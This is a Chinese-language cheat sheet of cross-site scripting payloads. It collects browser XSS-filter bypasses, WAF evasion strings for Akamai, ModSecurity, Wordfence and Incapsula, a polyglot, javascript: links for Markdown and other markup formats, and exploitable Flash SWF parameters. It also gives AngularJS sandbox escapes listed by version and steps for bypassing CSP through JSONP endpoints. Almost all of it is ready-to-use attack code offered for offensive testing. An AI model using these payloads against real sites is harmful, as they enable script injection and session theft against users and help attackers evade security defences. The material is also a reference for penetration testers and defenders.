## XSS

**Chrome XSS-Auditor 绕过** by [@vivekchsm](https://twitter.com/vivekchsm)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

**Chrome < v60 beta XSS-Auditor 绕过**

```html
<script src="data:,alert(1)%250A-->
```

**Other Chrome XSS-Auditor 绕过**

```html
<script>alert(1)</script
```

```html
<script>alert(1)%0d%0a-->%09</script
```

```html
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

**Safari XSS 向量** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)

```html
<script>location.href;'javascript:alert%281%29'</script>
```

**XSS 变种** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Kona WAF (Akamai) 绕过**

```html
\');confirm(1);//
```

**ModSecurity WAF 绕过**
注意:这取决于应用程序设置的安全级别。参见:https://modsecurity.org/rules.html

```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS 绕过**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**Incapsula WAF 绕过** by [@i_bo0om](https://twitter.com/i_bo0om)

```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
```

```html
<img/src=q onerror='new Function`al\ert\`1\``'>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

为了真正利用这个jQuery XSS，你需要满足以下要求之一:

1)发现任何跨域请求到不受信任的域，可能会无意中执行脚本。
2)找到任何可以将脚本注入数据源的可信API端点的请求。

**URL 验证绕过 （没有 `&#x09;` 也行)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript:confirm(1))
```

```md
[a](javascript://www.google.com%0Aprompt(1))
```

```md
[a](javascript://%0d%0aconfirm(1))
```

```md
[a](javascript://%0d%0aconfirm(1);com)
```

```md
[a](javascript:window.onerror=confirm;throw%201)
```

```md
[a]: (javascript:prompt(1))
```

```md
[a]:(javascript:alert(1))           //Add SOH Character
```


**Flash SWF XSS**

- ZeroClipboard: `ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf`

- plUpload Player: `plupload.flash.swf?%#target%g=alert&uid%g=XSS&`

- plUpload MoxiePlayer: `Moxie.swf?target%g=confirm&uid%g=XSS` (also works with `Moxie.cdn.swf` and other variants)

- FlashMediaElement: <code>flashmediaelement.swf?jsinitfunctio%gn=alert`1`</code>

- videoJS: `video-js.swf?readyFunction=confirm` and `video-js.swf?readyFunction=alert%28document.domain%2b'%20XSS'%29`

- YUI "io.swf": `io.swf?yid=\"));}catch(e){alert(document.domain);}//`

- YUI "uploader.swf": `uploader.swf?allowedDomain=\%22}%29%29%29}catch%28e%29{alert%28document.domain%29;}//<`

- Open Flash Chart: `open-flash-chart.swf?get-data=(function(){alert(1)})()`

- AutoDemo: `control.swf?onend=javascript:alert(1)//`

- Adobe FLV Progressive: `/main.swf?baseurl=asfunction:getURL,javascript:alert(1)//` and `/FLVPlayer_Progressive.swf?skinName=asfunction:getURL,javascript:alert(1)//`

- Banner.swf (generic): `banner.swf?clickTAG=javascript:alert(document.domain);//`

- JWPlayer (legacy): `player.swf?playerready=alert(document.domain)` and `/player.swf?tracecall=alert(document.domain)`

- SWFUpload 2.2.0.1: `swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!confirm(1);//`

- Uploadify (legacy): `uploadify.swf?movieName=%22])}catch(e){if(!window.x){window.x=1;confirm(%27XSS%27)}}//&.swf`

- FlowPlayer 3.2.7: `flowplayer-3.2.7.swf?config={"clip":{"url":"http://edge.flowplayer.org/bauhaus.mp4","linkUrl":"JavaScriPt:confirm(document.domain)"}}&.swf`

**_Note:关于构建基于flash的XSS有效负载的有用参考资料[MWR Labs](https://labs.mwrinfosecurity.com/blog/poppingalert1 -in-flash/)._Lightweight Markup Languages**

**RubyDoc** (.rdoc)

```rdoc
XSS[JavaScript:alert(1)]
```

**Textile** ([.textile](https://txstyle.org/))

```textile
"Test link":javascript:alert(1)
```

**reStructuredText** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))

```rst
`Test link`__.

__ javascript:alert(document.domain)  
```

**Unicode 编码**

```html
†‡•＜img src=a onerror=javascript:alert('test')>…‰€
```

**AngularJS 模板注入 XSS**

***要对活动目标进行手动验证，请使用“angular”。版本'在您的浏览器控制台*1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```js
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

```

**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```js
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)

```js
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)

```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```js
{{constructor.constructor('alert(1)')()}}
```

**Content Security Policy (CSP) 绕过 ，通过 JSONP**

获取目标 CSP:

```
curl -I http://example.com | grep 'Content-Security-Policy'
```

要么将CSP粘贴到https://csp-evaluator.withgoogle.com/中，要么将目标地址提交到“Content Security Policy”字段中。如果其中一个白名单域具有JSONP端点，CSP评估器将通知您。

![image](https://user-images.githubusercontent.com/18099289/32136707-a1c12510-bc12-11e7-8a80-8a22b3e94232.png)

现在，我们可以使用谷歌dork在上面列出的域中找到一些JSONP端点。

```
site:example.com inurl:callback
```
